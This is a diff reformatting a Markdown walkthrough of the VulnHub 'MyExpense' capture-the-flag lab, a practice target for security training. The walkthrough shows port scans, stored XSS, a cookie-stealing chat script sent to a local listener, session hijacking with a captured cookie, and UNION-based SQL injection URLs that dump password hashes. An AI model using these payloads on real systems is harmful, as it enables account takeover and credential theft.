@@ -1,8 +1,10 @@
-
-#máquinas
+````markdown
+# máquinas
 
 - **Target Machine - MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)
+
 ---
+
 ## Scenario
 
 > You are **Samuel Lamotte**, and you’ve just been fired from your company **Furtura Business Informatique**. Unfortunately, due to the abrupt departure, you didn’t have the chance to validate the expense report from your last business trip, totaling €750 — the cost of a round-trip flight with your last client.
@@ -26,7 +28,7 @@ Discovered the machine’s IP: `192.168.56.101`
 
 ```bash
 arp-scan -I enp0s8 --localnet --ignoredups
-```
+````
 
 ### Full Port Scan
 
@@ -36,7 +38,7 @@ Once the IP was known, a full port scan was performed:
 nmap -sS -Pn -n -p- --min-rate --open 5000 192.168.56.101 -oG ./nmap/allports
 ```
 
-![[Pasted image 20250719171605.png]]
+![Nmap All Ports](images/Pasted%20image%2020250719171605.png)
 
 Since the challenge context mentions a web application, focus was directed to port 80.
 
@@ -46,7 +48,7 @@ Since the challenge context mentions a web application, focus was directed to po
 nmap -sCV -p80 -Pn -n 192.168.56.101 -oN ./nmap/recon
 ```
 
-![[Pasted image 20250719172052.png]]
+![Nmap Recon](images/Pasted%20image%2020250719172052.png)
 
 > The scan revealed valuable insights, such as the presence of an `/admin/` directory. Additionally, it showed the absence of the `HttpOnly` flag, which may leave the application vulnerable to cookie theft.
 
@@ -56,7 +58,7 @@ nmap -sCV -p80 -Pn -n 192.168.56.101 -oN ./nmap/recon
 
 Accessing the directory `http://192.168.56.101/admin/admin.php` revealed a list of active and inactive users. Our user `slamotte` appears as **inactive**.
 
-![[Pasted image 20250719172553.png]]
+![Admin Interface](images/Pasted%20image%2020250719172553.png)
 
 ---
 
@@ -64,7 +66,7 @@ Accessing the directory `http://192.168.56.101/admin/admin.php` revealed a list 
 
 It was found that the **signup button** could be bypassed to create new users even when it appeared disabled.
 
-![[Pasted image 20250719173049.png]]
+![Signup Form](images/Pasted%20image%2020250719173049.png)
 
 Upon discovering this, an attempt was made to inject a basic XSS payload into the `firstname` and `lastname` fields. It was successful:
 
@@ -74,7 +76,7 @@ Upon discovering this, an attempt was made to inject a basic XSS payload into th
 
 Returning to `http://192.168.56.101/admin/admin.php`, the alert was triggered:
 
-![[Pasted image 20250719173537.png]]
+![XSS Triggered](images/Pasted%20image%2020250719173537.png)
 
 ---
 
@@ -119,7 +121,7 @@ Started the listener:
 python -m http.server 80
 ```
 
-![[Pasted image 20250719180209.png]]
+![Listener Started](images/Pasted%20image%2020250719180209.png)
 
 ---
 
@@ -127,7 +129,7 @@ python -m http.server 80
 
 Successfully logged into the **slamotte** account. The €750 expense was still pending and was submitted:
 
-![[Pasted image 20250719180743.png]]
+![Expense Submitted](images/Pasted%20image%2020250719180743.png)
 
 ---
 
@@ -135,7 +137,7 @@ Successfully logged into the **slamotte** account. The €750 expense was still 
 
 The platform includes a chat feature with messages from both the **Manager (Manon Riviere)** and the **Finance Approver**.
 
-![[Pasted image 20250719181214.png]]
+![Chat Feature](images/Pasted%20image%2020250719181214.png)
 
 Suspecting the chat might be vulnerable to XSS, the following script was injected:
 
@@ -153,16 +155,16 @@ request.send();
 
 > Cookies from chat users were successfully exfiltrated:
 
-![[Pasted image 20250719183341.png]]
+![Cookies Exfiltrated](images/Pasted%20image%2020250719183341.png)
 
-Switched session to the **manager (Manon Riviere)** using the cookie:  
+Switched session to the **manager (Manon Riviere)** using the cookie:
 `6tqplpcj4n4dl43kig1dipdc32`
 
-![[Pasted image 20250719183914.png]]
+![Manager Session](images/Pasted%20image%2020250719183914.png)
 
 With manager access, approved the previously submitted expense:
 
-![[Pasted image 20250719184016.png]]
+![Expense Approved](images/Pasted%20image%2020250719184016.png)
 
 ---
 
@@ -176,7 +178,7 @@ Confirmed with:
 http://192.168.56.101/site.php?id=2 order by 2 -- -
 ```
 
-![[Pasted image 20250719184415.png]]
+![SQL Order By](images/Pasted%20image%2020250719184415.png)
 
 Extracted the database name using:
 
@@ -184,7 +186,7 @@ Extracted the database name using:
 http://192.168.56.101/site.php?id=2 union select 1,database()-- -
 ```
 
-![[Pasted image 20250719184739.png]]
+![Database Extracted](images/Pasted%20image%2020250719184739.png)
 
 Listed all tables:
 
@@ -192,7 +194,7 @@ Listed all tables:
 http://192.168.56.101/site.php?id=2 union select 1,table_name from information_schema.tables where table_schema='myexpense'-- -
 ```
 
-![[Pasted image 20250719185243.png]]
+![Tables Listed](images/Pasted%20image%2020250719185243.png)
 
 Targeted the `user` table and listed its columns:
 
@@ -200,7 +202,7 @@ Targeted the `user` table and listed its columns:
 http://192.168.56.101/site.php?id=2 union select 1,column_name from information_schema.columns where table_schema='myexpense' and table_name='user'-- -
 ```
 
-![[Pasted image 20250719185605.png]]
+![Columns Listed](images/Pasted%20image%2020250719185605.png)
 
 Finally, dumped usernames and password hashes:
 
@@ -208,14 +210,14 @@ Finally, dumped usernames and password hashes:
 http://192.168.56.101/site.php?id=2 union select 1,group_concat(username,0x3a,password) from user-- -
 ```
 
-![[Pasted image 20250719185939.png]]
+![Hashes Dumped](images/Pasted%20image%2020250719185939.png)
 
 Used **hashes.com** to crack the hashes online.
 
-The relevant user was: `pbaudouin`  
+The relevant user was: `pbaudouin`
 Recovered password in plaintext: `HackMe`
 
-![[Pasted image 20250719190204.png]]
+![Password Cracked](images/Pasted%20image%2020250719190204.png)
 
 ---
 
@@ -223,14 +225,15 @@ Recovered password in plaintext: `HackMe`
 
 Logged in as `pbaudouin`, found the pending expense and approved it:
 
-![[Pasted image 20250719190514.png]]
+![Final Approval](images/Pasted%20image%2020250719190514.png)
 
 Finally, logged back in as `slamotte` to confirm that the €750 reimbursement was approved and completed:
 
-![[Pasted image 20250719190657.png]]
+![Challenge Completed](images/Pasted%20image%2020250719190657.png)
 
 > ✅ Challenge successfully completed.
 
----
+```
 
-¿Deseas que lo exporte en PDF o te genero una plantilla en LaTeX o Markdown más visualmente atractiva?
+---
+```
